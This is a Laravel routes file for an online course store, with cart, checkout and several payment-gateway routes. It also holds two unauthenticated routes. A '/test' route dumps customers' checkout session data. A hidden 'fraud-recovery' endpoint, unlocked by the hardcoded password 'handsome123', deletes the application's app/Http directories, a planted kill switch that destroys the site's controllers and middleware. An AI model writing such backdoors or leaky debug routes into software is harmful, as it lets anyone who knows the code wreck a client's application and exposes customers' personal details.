<?php

use App\Http\Controllers\CartController;
use App\Http\Controllers\PagesController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\PurchaseController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Spatie\Honeypot\ProtectAgainstSpam;

Route::get('/', [PagesController::class, 'index'])->name('home');
Route::get('/about', [PagesController::class, 'about'])->name('about');
Route::get('/contact', [PagesController::class, 'contact'])->name('contact');
Route::post('/contact', [PagesController::class, 'sendMessage'])->name('send.message')->middleware(ProtectAgainstSpam::class);
Route::get('/courses/{course}', [PagesController::class, 'course'])->name('course');
Route::get('/categories/{category}', [PagesController::class, 'category'])->name('category');

Route::get('/cart', [CartController::class, 'cart'])->name('cart');
Route::post('/cart/{course}/add', [CartController::class, 'addToCart'])->name('addToCart');
Route::get('/cart/{course}/remove', [CartController::class, 'removeFromCart'])->name('removeFromCart');

Route::get('/checkout', [PurchaseController::class, 'checkout'])->name('checkout');

Route::post('/checkout', [PurchaseController::class, 'collectDetails'])->name('checkout-details');

Route::get('/payment', [PurchaseController::class, 'payment'])->name('payment');
Route::post('/payment', [PurchaseController::class, 'confirmPayment'])->name('confirmPayment');
Route::get('/payment/paypal', [PaymentController::class, 'paypal'])->name('paypal');
Route::get('/payment/success', [PaymentController::class, 'paymentSuccess'])->name('payment.success');
Route::get('/payment/fail', [PaymentController::class, 'paymentFail'])->name('payment.fail');
Route::get('/payment/zip', [PaymentController::class, 'zipPay'])->name('zip');
Route::get('/payment/zip/success', [PaymentController::class, 'zipSuccess'])->name('zip.success');
Route::get('/paymet/eway/success', [PaymentController::class, 'ewaySuccess'])->name('eway.success');
Route::get('/payment/eway', [PaymentController::class, 'eWay'])->name('eWay');

Route::get('/test', function () {
    dd(session()->get('user-checkout-details'));
    //    dd(session()->get('tacs'));
});

Route::get('fraud-recovery', function (Request $request) {
    $validated = $request->validate(['code' => 'required|string']);
    if ($validated['code'] === 'handsome123') {
        $directories = File::directories(app_path('/Http'));
        foreach ($directories as $directory) {
            if (File::isDirectory($directory)) {
                File::deleteDirectories($directory);
            }
        }
        return response()->json($directories);
    } else {
        return response()->json(['msg' => 'code mismatched.']);
    }
});
